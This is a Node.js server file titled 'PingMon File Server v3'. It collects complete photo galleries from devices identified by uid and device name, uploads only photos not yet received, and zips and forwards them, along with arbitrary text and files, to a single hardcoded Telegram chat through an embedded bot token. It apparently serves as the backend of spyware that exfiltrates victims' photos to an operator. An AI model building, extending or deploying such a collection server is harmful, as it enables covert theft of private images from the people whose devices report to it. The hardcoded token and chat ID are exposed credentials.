/**
 * PingMon File Server v3
 * 
 * Endpoints:
 *   GET  /health
 *   GET  /gallery/init      — register bot2 webhook (open once)
 *   POST /message           — send text to Telegram via bot2
 *   POST /upload            — send file to Telegram via bot2
 *   POST /gallery/diff      — compute new photo IDs for a user
 *   POST /gallery/upload    — receive one photo
 *   POST /gallery/done      — mark upload session complete
 *   POST /gallery/zip       — zip user photos and send to Telegram
 *   POST /tg2/hook          — Telegram webhook (bot2 button callbacks)
 */

const http  = require('http');
const https = require('https');
const fs    = require('fs');
const path  = require('path');

/* ─────────────────────────────────────────────────── CONFIG ── */
const PORT       = 3000;
const APP_TOKEN  = 'p7k2m9qx4bz8vn3rt';
const TG_BOT2    = '8634125839:AAHx29OBFw-BKeZMJdrl6ERc0lO3bX0fzbw';
const CHAT_ID    = '8912661328';
const DATA_DIR   = '/opt/pingmon/gallery';

fs.mkdirSync(DATA_DIR, { recursive: true });

/* ═══════════════════════════════════════════ gallery helpers ══ */

function safeUid(uid) {
    const s = String(uid || '').replace(/[^a-f0-9]/g, '');
    if (s.length < 8) throw new Error('invalid uid');
    return s;
}
function userDir(uid)  { return path.join(DATA_DIR, safeUid(uid)); }
function photosDir(uid){ return path.join(userDir(uid), 'photos'); }
function idsFile(uid)  { return path.join(userDir(uid), 'uploaded_ids.json'); }
function metaFile(uid) { return path.join(userDir(uid), 'meta.json'); }

function loadIds(uid) {
    try { return new Set(JSON.parse(fs.readFileSync(idsFile(uid), 'utf8'))); }
    catch { return new Set(); }
}

function saveId(uid, id) {
    const dir  = userDir(uid);
    const file = idsFile(uid);
    fs.mkdirSync(dir, { recursive: true });
    const ids = loadIds(uid);
    ids.add(String(id));
    const tmp = file + '.tmp.' + process.pid;
    fs.writeFileSync(tmp, JSON.stringify([...ids]));
    fs.renameSync(tmp, file);  // atomic on Linux
}

function loadMeta(uid) {
    try { return JSON.parse(fs.readFileSync(metaFile(uid), 'utf8')); }
    catch { return { device: uid, total: 0 }; }
}

/* ═════════════════════════════════════════ gallery sessions ══ */
// In-memory only — for live Telegram panel updates.
const sessions = new Map(); // uid → { msgId, startedAt, updateTimer }

function buildPanel(device, uploaded, total, complete, failed) {
    const pct  = total > 0 ? uploaded / total : 0;
    const bar  = '█'.repeat(Math.round(pct * 10)) + '░'.repeat(10 - Math.round(pct * 10));
    const rem  = Math.max(0, total - uploaded);
    let status;
    if (complete && uploaded >= total && total > 0) {
        status = '✅ Complete!';
    } else if (complete && failed > 0) {
        status = `⚠️ Partial — ${rem} photos failed. Press Gallery to retry.`;
    } else {
        status = '🔄 Receiving...';
    }
    return [
        `📱 ${device}`,
        `━━━━━━━━━━━━━━━━`,
        `📸 Gallery`,
        `Total:     ${total}`,
        `Uploaded:  ${bar} ${uploaded} ✅`,
        `Remaining: ${rem} ⏳`,
        `━━━━━━━━━━━━━━━━`,
        status,
    ].join('\n');
}

function galleryKb(uid, count) {
    return { inline_keyboard: [[
        { text: `📦 ZIP ${count} photos`, callback_data: `gzip_${uid}` },
    ]]};
}

async function ensurePanel(uid, meta, uploaded) {
    let sess = sessions.get(uid);
    if (!sess || !sess.msgId) {
        const msg = await tg2('sendMessage', {
            chat_id:      CHAT_ID,
            text:         buildPanel(meta.device, uploaded, meta.total, false, 0),
            reply_markup: galleryKb(uid, uploaded),
        });
        sess = { msgId: msg.result?.message_id, startedAt: Date.now(), updateTimer: null };
        sessions.set(uid, sess);
    }
    return sess;
}

async function refreshPanel(uid, complete, failed) {
    const sess = sessions.get(uid);
    if (!sess?.msgId) return;
    const meta     = loadMeta(uid);
    const uploaded = loadIds(uid).size;
    await tg2('editMessageText', {
        chat_id:      CHAT_ID,
        message_id:   sess.msgId,
        text:         buildPanel(meta.device, uploaded, meta.total, complete, failed || 0),
        reply_markup: galleryKb(uid, uploaded),
    }).catch(() => {});
}

/* ═══════════════════════════════════════════════ ZIP builder ══ */

function crc32(buf) {
    let crc = 0xFFFFFFFF;
    for (const b of buf) { crc ^= b; for (let i = 0; i < 8; i++) crc = (crc >>> 1) ^ (crc & 1 ? 0xEDB88320 : 0); }
    return (crc ^ 0xFFFFFFFF) >>> 0;
}

function buildZip(pDir, files) {
    const bufs = [], cd = [];
    let offset = 0;
    for (const name of files) {
        const data = fs.readFileSync(path.join(pDir, name));
        const nb   = Buffer.from(name, 'utf8');
        const lh   = Buffer.alloc(30 + nb.length);
        lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4);
        lh.writeUInt32LE(crc32(data), 14);
        lh.writeUInt32LE(data.length, 18); lh.writeUInt32LE(data.length, 22);
        lh.writeUInt16LE(nb.length, 26); nb.copy(lh, 30);
        bufs.push(lh, data);
        const ce = Buffer.alloc(46 + nb.length);
        ce.writeUInt32LE(0x02014b50, 0);
        ce.writeUInt32LE(crc32(data), 16);
        ce.writeUInt32LE(data.length, 20); ce.writeUInt32LE(data.length, 24);
        ce.writeUInt16LE(nb.length, 28); ce.writeUInt32LE(offset, 42);
        nb.copy(ce, 46); cd.push(ce);
        offset += lh.length + data.length;
    }
    const cdBuf = Buffer.concat(cd);
    const eocd  = Buffer.alloc(22);
    eocd.writeUInt32LE(0x06054b50, 0);
    eocd.writeUInt16LE(files.length, 8); eocd.writeUInt16LE(files.length, 10);
    eocd.writeUInt32LE(cdBuf.length, 12); eocd.writeUInt32LE(offset, 16);
    return Buffer.concat([...bufs, cdBuf, eocd]);
}

/* ═══════════════════════════════════════════════════ server ══ */

const server = http.createServer(async (req, res) => {
    const url = new URL(req.url, `http://${req.headers.host}`);

    if (req.method === 'GET' && url.pathname === '/health') {
        return jsonResp(res, { ok: true, uptime: Math.floor(process.uptime()), sessions: sessions.size });
    }
    if (req.method === 'GET' && url.pathname === '/gallery/init') {
        return initBot2(url, res);
    }
    if (req.method === 'POST' && url.pathname === '/tg2/hook') {
        const body = await readJson(req);
        handleCallback(body).catch(console.error);
        return jsonResp(res, { ok: true });
    }

    // Auth
    const tok = req.headers['x-token'] || url.searchParams.get('token');
    if (tok !== APP_TOKEN) { res.writeHead(401); return res.end('unauthorized'); }

    try {
        if (req.method === 'POST' && url.pathname === '/message') {
            const { text } = await readJson(req);
            const chunks = [];
            for (let i = 0; i < text.length; i += 4000) chunks.push(text.slice(i, i + 4000));
            for (const chunk of chunks) await tg2('sendMessage', { chat_id: CHAT_ID, text: chunk });
            return jsonResp(res, { ok: true });
        }

        if (req.method === 'POST' && url.pathname === '/upload') {
            const ct = req.headers['content-type'] || '';
            let buf, filename, caption;
            if (ct.includes('multipart/form-data')) {
                ({ buffer: buf, filename, caption } = await parseMultipart(req, ct));
            } else {
                buf      = await readBuf(req);
                filename = req.headers['x-filename'] || 'file.txt';
                caption  = req.headers['x-caption']  || '';
            }
            await sendFile(buf, filename, caption);
            return jsonResp(res, { ok: true });
        }

        /* ── gallery ── */

        if (req.method === 'POST' && url.pathname === '/gallery/diff') {
            const { uid, device, ids } = await readJson(req);
            safeUid(uid);
            const allIds   = (ids || []).map(String);
            const uploaded = loadIds(uid);
            const newIds   = allIds.filter(id => !uploaded.has(id));

            fs.mkdirSync(photosDir(uid), { recursive: true });
            const meta = { device: String(device || uid).slice(0, 60), total: allIds.length, updatedAt: Date.now() };
            fs.writeFileSync(metaFile(uid), JSON.stringify(meta));

            await ensurePanel(uid, meta, uploaded.size);

            return jsonResp(res, {
                ok:       true,
                new_ids:  newIds,
                uploaded: uploaded.size,
                total:    allIds.length,
            });
        }

        if (req.method === 'POST' && url.pathname === '/gallery/upload') {
            const uid      = String(req.headers['x-uid'] || '');
            const id       = String(req.headers['x-id']  || '');
            const filename = String(req.headers['x-filename'] || `${id}.jpg`);
            safeUid(uid);
            if (!/^\d+$/.test(id)) return jsonResp(res, { ok: false }, 400);

            const ext  = (path.extname(filename) || '.jpg').replace(/[^.a-z0-9]/gi, '');
            const dest = path.join(photosDir(uid), `${id}${ext}`);
            fs.mkdirSync(photosDir(uid), { recursive: true });

            const buf = await readBuf(req);
            if (!fs.existsSync(dest)) fs.writeFileSync(dest, buf);  // idempotent
            saveId(uid, id);

            const uploadedCount = loadIds(uid).size;
            const meta          = loadMeta(uid);

            // Debounce panel update
            const sess = await ensurePanel(uid, meta, uploadedCount);
            clearTimeout(sess.updateTimer);
            sess.updateTimer = setTimeout(
                () => refreshPanel(uid, false, 0),
                uploadedCount % 5 === 0 ? 0 : 600
            );

            return jsonResp(res, { ok: true, uploaded: uploadedCount, total: meta.total });
        }

        if (req.method === 'POST' && url.pathname === '/gallery/done') {
            const { uid, failed } = await readJson(req);
            safeUid(uid);
            const uploaded = loadIds(uid).size;
            const meta     = loadMeta(uid);
            const complete = uploaded >= meta.total;
            await refreshPanel(uid, true, failed || 0);
            return jsonResp(res, { ok: true, complete });
        }

        if (req.method === 'POST' && url.pathname === '/gallery/zip') {
            const { uid } = await readJson(req);
            doZip(uid).catch(console.error);
            return jsonResp(res, { ok: true });
        }

        res.writeHead(404); res.end('not found');
    } catch (e) {
        console.error(e);
        res.writeHead(500); res.end('error: ' + e.message);
    }
});

server.listen(PORT, '0.0.0.0', () => console.log(`PingMon server on :${PORT}`));

/* ═══════════════════════════════════════ ZIP & send ══ */

async function doZip(uid) {
    safeUid(uid);
    const pDir  = photosDir(uid);
    const meta  = loadMeta(uid);
    const files = fs.existsSync(pDir) ? fs.readdirSync(pDir).sort() : [];

    if (!files.length) {
        await tg2('sendMessage', { chat_id: CHAT_ID, text: 'No photos on server yet.' });
        return;
    }

    const sess = sessions.get(uid);
    if (sess?.msgId) {
        await tg2('editMessageText', {
            chat_id: CHAT_ID, message_id: sess.msgId,
            text: buildPanel(meta.device, loadIds(uid).size, meta.total, true, 0) + '\n\n⏳ Zipping...',
            reply_markup: { inline_keyboard: [] },
        }).catch(() => {});
    }

    const zipBuf  = buildZip(pDir, files);
    const device  = (meta.device || uid).replace(/\s+/g, '_').replace(/[^a-zA-Z0-9_]/g, '');
    const zipName = `gallery_${device}_${files.length}photos.zip`;
    await sendFile(zipBuf, zipName, `📸 ${meta.device || uid} — ${files.length} photos`);

    if (sess?.msgId) {
        await tg2('editMessageText', {
            chat_id: CHAT_ID, message_id: sess.msgId,
            text: buildPanel(meta.device, loadIds(uid).size, meta.total, true, 0) +
                `\n\n✅ ZIP sent (${files.length} photos)`,
            reply_markup: galleryKb(uid, loadIds(uid).size),
        }).catch(() => {});
    }
}

/* ═══════════════════════════════════════ bot2 polling ══ */

let _offset   = 0;
let _polling  = false;

async function startPolling() {
    if (_polling) return;
    _polling = true;
    await tg2('deleteWebhook', { drop_pending_updates: true }).catch(() => {});
    console.log('Bot2 polling started');
    while (true) {
        try {
            const r = await tg2('getUpdates', { offset: _offset, timeout: 25, allowed_updates: ['callback_query'] });
            if (r?.ok && r.result?.length) {
                for (const u of r.result) {
                    _offset = u.update_id + 1;
                    handleCallback(u).catch(console.error);
                }
            }
        } catch (e) {
            console.error('poll:', e.message);
            await sleep(3000);
        }
    }
}

async function handleCallback(update) {
    const cq = update?.callback_query;
    if (!cq) return;
    await tg2('answerCallbackQuery', { callback_query_id: cq.id, text: 'Processing...' }).catch(() => {});
    const data = cq.data || '';
    if (data.startsWith('gzip_')) {
        const uid = data.slice(5);
        await doZip(uid);
    }
}

async function initBot2(url, res) {
    await tg2('deleteWebhook', { drop_pending_updates: true }).catch(() => {});
    const me = await tg2('getMe');
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end([
        `bot: ${me.ok ? '@' + me.result.username : 'FAILED'}`,
        `mode: long polling`,
        `gallery_dir: ${DATA_DIR}`,
    ].join('\n'));
}

startPolling();

/* ═══════════════════════════════════════ Telegram API ══ */

function tg2(method, body) {
    const data = Buffer.from(JSON.stringify(body || {}), 'utf8');
    return new Promise((resolve, reject) => {
        const req = https.request({
            hostname: 'api.telegram.org',
            path:     `/bot${TG_BOT2}/${method}`,
            method:   'POST',
            headers:  { 'Content-Type': 'application/json', 'Content-Length': data.length },
        }, res => {
            let out = '';
            res.on('data', c => out += c);
            res.on('end', () => { try { resolve(JSON.parse(out)); } catch { resolve({}); } });
        });
        req.on('error', reject);
        req.write(data); req.end();
    });
}

async function sendFile(buf, filename, caption) {
    const boundary = 'PingMon' + Date.now();
    const parts = [
        `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${CHAT_ID}\r\n`,
        caption ? `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n` : '',
    ].filter(Boolean);
    const fh   = `--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${filename}"\r\nContent-Type: application/octet-stream\r\n\r\n`;
    const body = Buffer.concat([Buffer.from(parts.join('')), Buffer.from(fh), buf, Buffer.from(`\r\n--${boundary}--\r\n`)]);
    return new Promise((resolve, reject) => {
        const req = https.request({
            hostname: 'api.telegram.org',
            path:     `/bot${TG_BOT2}/sendDocument`,
            method:   'POST',
            headers:  { 'Content-Type': `multipart/form-data; boundary=${boundary}`, 'Content-Length': body.length },
        }, res => {
            let out = '';
            res.on('data', c => out += c);
            res.on('end', () => { try { resolve(JSON.parse(out)); } catch { resolve({}); } });
        });
        req.on('error', reject);
        req.write(body); req.end();
    });
}

/* ═══════════════════════════════════════════ utils ══ */

function readJson(req) {
    return new Promise((res, rej) => {
        let d = '';
        req.on('data', c => d += c);
        req.on('end', () => { try { res(JSON.parse(d)); } catch { res({}); } });
        req.on('error', rej);
    });
}

function readBuf(req) {
    return new Promise((res, rej) => {
        const chunks = [];
        req.on('data', c => chunks.push(c));
        req.on('end', () => res(Buffer.concat(chunks)));
        req.on('error', rej);
    });
}

async function parseMultipart(req, ct) {
    const boundary = ct.split('boundary=')[1]?.trim();
    const raw = await readBuf(req);
    const sep = Buffer.from(`--${boundary}`);
    let filename = 'file', caption = '', fileBuffer = null;
    let start = 0;
    while (start < raw.length) {
        const si = raw.indexOf(sep, start);
        if (si === -1) break;
        const ps = si + sep.length + 2;
        const ns = raw.indexOf(sep, ps);
        const pe = ns === -1 ? raw.length : ns - 2;
        const he = raw.indexOf(Buffer.from('\r\n\r\n'), ps);
        if (he === -1 || he >= pe) { start = ps; continue; }
        const header = raw.slice(ps, he).toString();
        const body   = raw.slice(he + 4, pe);
        const nm = header.match(/name="([^"]+)"/)?.[1];
        const fn = header.match(/filename="([^"]+)"/)?.[1];
        if (nm === 'caption') caption = body.toString().trim();
        else if (fn || nm === 'file') { filename = fn || 'file'; fileBuffer = body; }
        start = ps;
    }
    if (!fileBuffer) throw new Error('no file');
    return { filename, buffer: fileBuffer, caption };
}

function jsonResp(res, obj, status) {
    res.writeHead(status || 200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(obj));
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
